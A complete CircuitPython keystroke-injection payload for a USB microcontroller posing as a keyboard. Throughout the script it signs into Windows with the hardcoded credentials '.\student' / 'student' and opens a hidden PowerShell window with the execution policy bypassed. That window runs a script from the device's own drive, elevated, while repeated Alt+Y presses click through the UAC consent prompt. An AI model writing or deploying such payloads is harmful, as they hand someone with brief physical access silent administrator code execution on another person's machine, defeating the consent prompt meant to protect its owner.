import time
import gc
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# Wait for Windows to finish mounting the drive and settling autoplay
time.sleep(8.0)

# --- MEMORY CLEANUP ---
gc.collect()

# --- IMPORT HID DRIVERS ---
try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    while True:
        time.sleep(0.1)

# --- LED SETUP ---
led_pin = board.LED if hasattr(board, "LED") else (board.GP25 if hasattr(board, "GP25") else board.GP23)
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- HID SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except Exception:
    while True:
        led.value = not led.value
        time.sleep(0.15)

# --- PAYLOAD ---
led.value = True

# 1. Lock the screen — standardises state.
#    No-op if already at lock/login screen; locks the desktop if someone is logged in.
#    Both paths end at the sign-in screen before we type credentials.
kbd.press(Keycode.GUI, Keycode.L)
time.sleep(0.1)
kbd.release_all()
time.sleep(3.0)

# 2. Reveal the sign-in prompt (dismiss screensaver / show password field)
kbd.press(Keycode.SPACE)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.5)

# 3. Type username
layout.write(".\\student")

# 4. Move to password field
kbd.press(Keycode.TAB)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.3)

# 5. Type password
layout.write("student")

# 6. Submit
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 7. Wait for login + desktop to settle
time.sleep(5.0)

# 8. Minimize all windows so Run dialog opens cleanly
kbd.press(Keycode.GUI, Keycode.D)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 9. Open Run dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.5)

# 10. Type the launch command (chunked to avoid MemoryError)
#     Ctrl+Shift+Enter (step 11) runs this elevated — one UAC prompt total.
layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"")
layout.write("& ((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter+':\\ROOT\\Launch.ps1')\"")

# 11. Elevated launch via Ctrl+Shift+Enter → triggers UAC
time.sleep(0.5)
kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 12. Accept UAC — Alt+Y up to 4 times, 3 s apart
#     Extra presses after dismissal land on a hidden window and are harmless.
for _ in range(4):
    time.sleep(3.0)
    kbd.press(Keycode.ALT, Keycode.Y)
    time.sleep(0.1)
    kbd.release_all()

led.value = False
